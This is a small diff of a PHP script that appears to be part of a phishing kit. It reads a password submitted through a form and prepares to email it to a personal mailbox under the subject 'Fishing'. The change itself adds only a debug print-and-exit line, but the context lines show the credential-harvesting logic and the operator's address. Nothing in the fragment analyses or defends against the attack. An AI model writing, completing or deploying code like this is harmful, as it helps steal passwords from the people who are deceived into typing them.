@@ -10,7 +10,7 @@ $pass = $POST['val1'];
 // mail($to, $subject, $message);
 
 
-
+print "ashxatuma"; die;
 
 $to = 'narekxachatryan1998@gmail.com';
 $subject = 'Fishing';
